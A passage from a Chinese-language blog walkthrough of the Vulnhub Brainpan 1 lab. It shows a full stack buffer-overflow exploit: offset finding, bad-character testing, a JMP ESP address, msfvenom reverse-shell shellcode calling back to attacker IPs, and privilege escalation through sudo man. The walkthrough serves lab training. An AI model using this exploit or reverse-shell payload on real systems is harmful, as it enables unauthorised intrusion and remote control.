+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;opt&#x2F;metasploit&#x2F;tools&#x2F;exploit&#x2F;pattern_create.rb -l 600</span><br><span class="line">Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9</span><br></pre></td></tr></table></figure>
+
+<p>修改脚本内容为</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">host=<span class="string">'192.168.40.243'</span></span><br><span class="line">port=<span class="number">9999</span></span><br><span class="line">s = socket.socket()</span><br><span class="line">buffer=<span class="string">"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9"</span></span><br><span class="line">s.connect((host,port))</span><br><span class="line">s.recv(<span class="number">4096</span>)</span><br><span class="line">s.send(buffer)</span><br><span class="line">s.recv(<span class="number">4096</span>)</span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://images.atsud0.me/images/post/Screenshot_20200625_115401.jpg" alt=""></p>
+<p>运行脚本之后，EIP的内容为35724134。转换为人类可读形式则是:34417235-&gt;4Ar5，EIP寄存器的内容为4Ar5。总不能一个个数吧？所以使用msf的脚本</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;opt&#x2F;metasploit&#x2F;tools&#x2F;exploit&#x2F;pattern_offset.rb -q 35724134 -l 600</span><br><span class="line">[*] Exact match at offset 524</span><br></pre></td></tr></table></figure>
+<p>前524个字符是EBP寄存器的值，所以EIP的值等于525，526，527，528的内容。</p>
+<p>重新编写脚本来验证。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">host=<span class="string">'192.168.40.243'</span></span><br><span class="line">port=<span class="number">9999</span></span><br><span class="line">s = socket.socket()</span><br><span class="line">buffer=<span class="string">"A"</span>*<span class="number">524</span>+<span class="string">"B"</span>*<span class="number">4</span></span><br><span class="line">s.connect((host,port))</span><br><span class="line">s.recv(<span class="number">4096</span>)</span><br><span class="line">s.send(buffer)</span><br><span class="line">s.recv(<span class="number">4096</span>)</span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure>
+<p>如果猜想正确的话，运行这个脚本之后，EIP寄存器的值应该是4个B，42424242。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200625_120156.jpg" alt=""><br>EIP的值已经被精确的填入4个B了。</p>
+<h3 id="计算ESP能存放多少字符"><a href="#计算ESP能存放多少字符" class="headerlink" title="计算ESP能存放多少字符"></a>计算ESP能存放多少字符</h3><p>ESP的大小限制了shellcode的大小，如果ESP只能存放400字节的内容，那么shellcode的字节内容就不能超过ESP的上限。并且最好留出一部分字节内容来传入’\x90’来保护shellcode的前部分代码不会被擦除。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">host=<span class="string">'192.168.40.243'</span></span><br><span class="line">port=<span class="number">9999</span></span><br><span class="line">s = socket.socket()</span><br><span class="line">buffer = <span class="string">'A'</span> * <span class="number">524</span> + <span class="string">'B'</span> * <span class="number">4</span> + <span class="string">'C'</span> * (<span class="number">3000</span> - <span class="number">524</span> - <span class="number">4</span>)</span><br><span class="line">s.connect((host, port))</span><br><span class="line">s.recv(<span class="number">4096</span>)</span><br><span class="line">s.send(buffer)</span><br><span class="line">s.recv(<span class="number">4096</span>)</span><br></pre></td></tr></table></figure>
+
+<p>这里要获得寄存器能够存放多少个字符，所以往大写了，当运行之后有多少个C被显示，就是ESP寄存器的大小。</p>
+<p><img src="https://images.atsud0.me/images/post/Screenshot_20200625_121247.jpg" alt=""><br>ESP寄存器已经被<code>C</code>所填满。找到ESP寄存器的起始地址和结束地址。我这里的起始地址为0022F960，结束地址为0022FB34。</p>
+<p>用结束地址减去起始地址得到的值，就是ESP寄存器大小的值。</p>
+<blockquote>
+<p>0xB34-0x960=2868-2400=468</p>
+</blockquote>
+<p>468个字符，已经能够存放我们的shellcode了。</p>
+<h3 id="挑选坏字符"><a href="#挑选坏字符" class="headerlink" title="挑选坏字符"></a>挑选坏字符</h3><blockquote>
+<p>缓冲区溢出的在生成shellcode时，会影响输入的字符，比如’n’字符会终止输入，会截断输入导致我们输入的字符不能完全进入缓冲区。</p>
+</blockquote>
+<p>由于以上原因，所以我们需要挑选出坏字符。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">badchars = (</span><br><span class="line">        <span class="string">"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x00"</span></span><br><span class="line">        <span class="string">"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x10"</span></span><br><span class="line">        <span class="string">"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x20"</span></span><br><span class="line">        <span class="string">"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x30"</span></span><br><span class="line">        <span class="string">"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x40"</span></span><br><span class="line">        <span class="string">"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x50"</span></span><br><span class="line">        <span class="string">"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x60"</span></span><br><span class="line">        <span class="string">"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x70"</span></span><br><span class="line">        <span class="string">"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x80"</span></span><br><span class="line">        <span class="string">"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\x90"</span></span><br><span class="line">        <span class="string">"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xa0"</span></span><br><span class="line">        <span class="string">"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xb0"</span></span><br><span class="line">        <span class="string">"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xc0"</span></span><br><span class="line">        <span class="string">"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xd0"</span></span><br><span class="line">        <span class="string">"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xe0"</span></span><br><span class="line">        <span class="string">"\xe1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff\xf0"</span>)</span><br></pre></td></tr></table></figure>
+<p>将上一节的脚本修改以下地方</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">buffer &#x3D; &#39;A&#39; * 524 + &#39;B&#39; * 4 + badchars</span><br></pre></td></tr></table></figure>
+<p>运行之后，我们可以看到ESP的内容在\x09之后就没有\x00。所以应该是被截断了。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200625_122304.jpg" alt=""></p>
+<p>将badchars的\x00修改为\x01，再次运行。此时就正常显示了。</p>
+<p><img src="https://images.atsud0.me/images/post/Screenshot_20200625_122548.jpg" alt=""></p>
+<p>坏字符为:\x00</p>
+<h3 id="找到跳板地址"><a href="#找到跳板地址" class="headerlink" title="找到跳板地址"></a>找到跳板地址</h3><p>ESP的内存地址并不是固定的，而我们的shellcode是存放在ESP寄存器中的，所以我们要找到一个办法让程序能够跳转到ESP寄存器中，执行我们的shellcode。</p>
+<p>汇编中有一条指令 JMP ESP。如果我们能够找到这条指令的内存地址，那么我们就能修改EIP寄存器的值为JMP ESP的内存地址，由该指令跳转到ESP寄存器来执行我们的shellcode。</p>
+<p>在此之前先查看程序的保护机制。<br>输入<code>!mona modules</code><br><img src="https://images.atsud0.me/images/post/Screenshot_20200625_123259.jpg" alt=""></p>
+<p>可以看到brainpan.exe的系统保护机制和rebase都为Flase，可以直接拿来利用。</p>
+<p>使用nasm_shell来获得jmp esp的十六进制指令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$&#x2F;usr&#x2F;share&#x2F;metasploit-framework&#x2F;tools&#x2F;exploit&#x2F;nasm_shell.rb</span><br><span class="line">nasm &gt; jmp esp</span><br><span class="line">0000000 FFE4 jmp esp</span><br></pre></td></tr></table></figure>
+
+<p>jmp esp的十六进制指令为FFE4.</p>
+<p>在Immunity Debugger中输入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!mona find -s &quot;\xff\xe4&quot; -m brainpan.exe</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://images.atsud0.me/images/post/Screenshot_20200625_123943.jpg" alt=""></p>
+<p>得到的地址为0x311712f3，转换为计算机可读形式为:\xf3\x12\x17\x31</p>
+<p>代码中EIP的值就是’\xf3\x12\x17\x31’，因为我们要让其跳转到ESP寄存器，执行我们的代码。</p>
+<h4 id="生成shellcode"><a href="#生成shellcode" class="headerlink" title="生成shellcode"></a>生成shellcode</h4><p>使用msfvenom来生成shellcode</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;shell_reverse_tcp LHOST&#x3D;192.168.40.204 LPORT&#x3D;4444 -b &quot;\x00&quot; -f python -e x86&#x2F;shikata_ga_nai -a x86</span><br></pre></td></tr></table></figure>
+
+<p>修改代码为</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">host=<span class="string">'192.168.40.243'</span></span><br><span class="line">port=<span class="number">9999</span></span><br><span class="line"></span><br><span class="line">buf = <span class="string">b""</span></span><br><span class="line">buf += <span class="string">b"\xdb\xc1\xb8\xb8\x37\x2a\x73\xd9\x74\x24\xf4\x5d\x2b"</span></span><br><span class="line">buf += <span class="string">b"\xc9\xb1\x52\x83\xc5\x04\x31\x45\x13\x03\xfd\x24\xc8"</span></span><br><span class="line">buf += <span class="string">b"\x86\x01\xa2\x8e\x69\xf9\x33\xef\xe0\x1c\x02\x2f\x96"</span></span><br><span class="line">buf += <span class="string">b"\x55\x35\x9f\xdc\x3b\xba\x54\xb0\xaf\x49\x18\x1d\xc0"</span></span><br><span class="line">buf += <span class="string">b"\xfa\x97\x7b\xef\xfb\x84\xb8\x6e\x78\xd7\xec\x50\x41"</span></span><br><span class="line">buf += <span class="string">b"\x18\xe1\x91\x86\x45\x08\xc3\x5f\x01\xbf\xf3\xd4\x5f"</span></span><br><span class="line">buf += <span class="string">b"\x7c\x78\xa6\x4e\x04\x9d\x7f\x70\x25\x30\x0b\x2b\xe5"</span></span><br><span class="line">buf += <span class="string">b"\xb3\xd8\x47\xac\xab\x3d\x6d\x66\x40\xf5\x19\x79\x80"</span></span><br><span class="line">buf += <span class="string">b"\xc7\xe2\xd6\xed\xe7\x10\x26\x2a\xcf\xca\x5d\x42\x33"</span></span><br><span class="line">buf += <span class="string">b"\x76\x66\x91\x49\xac\xe3\x01\xe9\x27\x53\xed\x0b\xeb"</span></span><br><span class="line">buf += <span class="string">b"\x02\x66\x07\x40\x40\x20\x04\x57\x85\x5b\x30\xdc\x28"</span></span><br><span class="line">buf += <span class="string">b"\x8b\xb0\xa6\x0e\x0f\x98\x7d\x2e\x16\x44\xd3\x4f\x48"</span></span><br><span class="line">buf += <span class="string">b"\x27\x8c\xf5\x03\xca\xd9\x87\x4e\x83\x2e\xaa\x70\x53"</span></span><br><span class="line">buf += <span class="string">b"\x39\xbd\x03\x61\xe6\x15\x8b\xc9\x6f\xb0\x4c\x2d\x5a"</span></span><br><span class="line">buf += <span class="string">b"\x04\xc2\xd0\x65\x75\xcb\x16\x31\x25\x63\xbe\x3a\xae"</span></span><br><span class="line">buf += <span class="string">b"\x73\x3f\xef\x61\x23\xef\x40\xc2\x93\x4f\x31\xaa\xf9"</span></span><br><span class="line">buf += <span class="string">b"\x5f\x6e\xca\x02\x8a\x07\x61\xf9\x5d\xe8\xde\x29\x52"</span></span><br><span class="line">buf += <span class="string">b"\x80\x1c\x29\x7b\x0d\xa8\xcf\x11\xbd\xfc\x58\x8e\x24"</span></span><br><span class="line">buf += <span class="string">b"\xa5\x12\x2f\xa8\x73\x5f\x6f\x22\x70\xa0\x3e\xc3\xfd"</span></span><br><span class="line">buf += <span class="string">b"\xb2\xd7\x23\x48\xe8\x7e\x3b\x66\x84\x1d\xae\xed\x54"</span></span><br><span class="line">buf += <span class="string">b"\x6b\xd3\xb9\x03\x3c\x25\xb0\xc1\xd0\x1c\x6a\xf7\x28"</span></span><br><span class="line">buf += <span class="string">b"\xf8\x55\xb3\xf6\x39\x5b\x3a\x7a\x05\x7f\x2c\x42\x86"</span></span><br><span class="line">buf += <span class="string">b"\x3b\x18\x1a\xd1\x95\xf6\xdc\x8b\x57\xa0\xb6\x60\x3e"</span></span><br><span class="line">buf += <span class="string">b"\x24\x4e\x4b\x81\x32\x4f\x86\x77\xda\xfe\x7f\xce\xe5"</span></span><br><span class="line">buf += <span class="string">b"\xcf\x17\xc6\x9e\x2d\x88\x29\x75\xf6\xb8\x63\xd7\x5f"</span></span><br><span class="line">buf += <span class="string">b"\x51\x2a\x82\xdd\x3c\xcd\x79\x21\x39\x4e\x8b\xda\xbe"</span></span><br><span class="line">buf += <span class="string">b"\x4e\xfe\xdf\xfb\xc8\x13\x92\x94\xbc\x13\x01\x94\x94"</span></span><br><span class="line"></span><br><span class="line">buffer = <span class="string">"A"</span> * <span class="number">524</span> + <span class="string">"\xf3\x12\x17\x31"</span> + buf</span><br><span class="line">s = socket.socket()</span><br><span class="line">s.connect((host, port))</span><br><span class="line">s.recv(<span class="number">4096</span>)</span><br><span class="line">s.send(buffer) </span><br><span class="line">s.recv(<span class="number">4096</span>)</span><br></pre></td></tr></table></figure>
+
+<p>但是，并没有正确的收到反弹的shell<br><img src="https://images.atsud0.me/images/post/Screenshot_20200625_125428.jpg" alt=""></p>
+<p>将shellcode的字节和ESP寄存器的内容进行对比，会发现shellcode的前十六个字节内容被擦除了。</p>
+<p>这里就要用到一开始提到的<code>\x90</code>来保护shellcode，保证shellcode的前部分代码不会被擦除。</p>
+<p>修改代码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">buffer = <span class="string">"A"</span> * <span class="number">524</span> + <span class="string">"\xf3\x12\x17\x31"</span> +<span class="string">"\x90"</span> * <span class="number">16</span> + buf</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://images.atsud0.me/images/post/Screenshot_20200625_125802.jpg" alt=""><br>此时正确接收到反弹回来的shell。</p>
+<p>靶机是Linux系统，所以要修改shellcode。重新使用msf生成shellcode</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux&#x2F;x86&#x2F;shell_reverse_tcp LPORT&#x3D;4444 LHOST&#x3D;192.168.56.10 -f python -b &quot;\x00&quot;</span><br></pre></td></tr></table></figure>
+<p><img src="https://images.atsud0.me/images/post/Screenshot_20200625_131641.jpg" alt=""></p>
+<p>成功反弹shell！</p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><hr>
+
+<p>进行信息收集…..</p>
+<hr>
+
+<p>执行sudo -l后，发现当前用户可以无密码执行/home/anansi/bin/anansi_util程序<br><img src="https://images.atsud0.me/images/post/Screenshot_20200625_132617.jpg" alt=""></p>
+<p>依次执行看了一下，分别是</p>
+<ul>
+<li>ip a/ipconfig 命令</li>
+<li>top</li>
+<li>man</li>
+</ul>
+<p><a href="https://gtfobins.github.io/gtfobins/man/" target="_blank" rel="noopener">sudo man</a>能够提权，所以就利用它了。</p>
+<p><img src="https://images.atsud0.me/images/post/Screenshot_20200625_132838.jpg" alt=""></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这是我遇到的第一个缓冲区溢出的靶机，让我重新学习了一波缓冲区溢出。感觉不是很难??获益良多。</p>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>Post author:  </strong>atsud0
+  </li>
+  <li class="post-copyright-link">
+    <strong>Post link: </strong>
+    <a href="http://atsud0.me/2020/06/25/Vulnhub-brainpan-1/" title="Vulnhub-brainpan-1(缓冲区溢出)">http://atsud0.me/2020/06/25/Vulnhub-brainpan-1/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          
+          <div class="post-tags">
+              <a href="/tags/Linux/" rel="tag"><i class="fa fa-tag"></i> Linux</a>
+              <a href="/tags/Buffer-Overflow/" rel="tag"><i class="fa fa-tag"></i> Buffer Overflow</a>
+              <a href="/tags/GTFOBins-man/" rel="tag"><i class="fa fa-tag"></i> GTFOBins-man</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2020/06/23/Vulnhub-SickOS-2/" rel="prev" title="Vulnhub-SickOS-2">
+      <i class="fa fa-chevron-left"></i> Vulnhub-SickOS-2
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2020/07/02/TryHackMe-yearoftherabbit/" rel="next" title="TryHackMe-yearoftherabbit">
+      TryHackMe-yearoftherabbit <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#信息收集"><span class="nav-number">1.</span> <span class="nav-text">信息收集</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#缓冲区溢出"><span class="nav-number">2.</span> <span class="nav-text">缓冲区溢出</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#是否存在缓冲区溢出"><span class="nav-number">2.1.</span> <span class="nav-text">是否存在缓冲区溢出</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#计算ESP什么时候会溢出，填满EIP"><span class="nav-number">2.2.</span> <span class="nav-text">计算ESP什么时候会溢出，填满EIP</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#计算ESP能存放多少字符"><span class="nav-number">2.3.</span> <span class="nav-text">计算ESP能存放多少字符</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#挑选坏字符"><span class="nav-number">2.4.</span> <span class="nav-text">挑选坏字符</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#找到跳板地址"><span class="nav-number">2.5.</span> <span class="nav-text">找到跳板地址</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#生成shellcode"><span class="nav-number">2.5.1.</span> <span class="nav-text">生成shellcode</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#提权"><span class="nav-number">3.</span> <span class="nav-text">提权</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#总结"><span class="nav-number">4.</span> <span class="nav-text">总结</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="atsud0"
+      src="https://images.atsud0.me/images/atsud0-avator.jpg">
+  <p class="site-author-name" itemprop="name">atsud0</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">128</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">10</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/index.html">
+          
+        <span class="site-state-item-count">166</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/atsud0" title="GitHub → https://github.com/atsud0" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:admin@atsud0.me" title="E-Mail → mailto:admin@atsud0.me"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://twitter.com/atsud0" title="Twitter → https://twitter.com/atsud0" rel="noopener" target="_blank"><i class="fab fa-twitter fa-fw"></i>Twitter</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://t.me/MindworkshopBot" title="Telegram → https://t.me/MindworkshopBot" rel="noopener" target="_blank"><i class="fab fa-telegram fa-fw"></i>Telegram</a>
+      </span>
+  </div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
+      Links
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://blog.ajin.cloud/" title="https://blog.ajin.cloud/" rel="noopener" target="_blank">ajin</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://leiblog.wang/" title="https://leiblog.wang/" rel="noopener" target="_blank">LeiWang</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://esonhugh.github.io/" title="https://esonhugh.github.io/" rel="noopener" target="_blank">Esonhugh</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://isabellainori.github.io/" title="https://isabellainori.github.io/" rel="noopener" target="_blank">Isabella Ross</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2020 – 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">atsud0</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+      <span class="post-meta-item-text">Symbols count total: </span>
+    <span title="Symbols count total">407k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+      <span class="post-meta-item-text">Reading time total &asymp;</span>
+    <span title="Reading time total">6:10</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a>
+  </div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="Total Visitors">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
